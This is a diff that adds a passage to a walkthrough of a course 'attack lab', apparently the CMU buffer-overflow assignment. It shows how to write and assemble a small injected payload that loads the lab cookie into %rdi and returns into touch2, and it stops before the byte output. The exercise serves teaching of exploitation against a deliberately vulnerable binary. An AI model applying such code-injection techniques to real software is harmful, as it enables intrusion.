@@ -27,3 +27,19 @@ If you look inside the ```rtarget_dump.s``` fil and search for touch2, it looks 
   40199b:       bf 00 00 00 00          mov    $0x0,%edi
   4019a0:       e8 ab f4 ff ff          callq  400e50 <exit@plt>
   ```
+If you read the instruction pdf, it says, "Recall that the first argument to a function is passed in register %rdi."
+
+So our goal is to modify the %rdi register and store our cookie in there.
+
+So you have to write some assembly code for that task, create a file called ```phase2.s``` and write the below code, replacing the cookie with yours from the previous phase.
+```assembly
+  movq $0x3451d86d,%rdi /* move your cookie to register %rdi */
+  retq                  /* return */
+```
+Now you need the byte representation of the code you wrote above, compile it with gcc then dissasemble it.
+
+```ssh
+gcc -c phase2.s
+objdump -d phase2.o  > phase2.d 
+```
+Now open the file phase2.d and you will get something like below
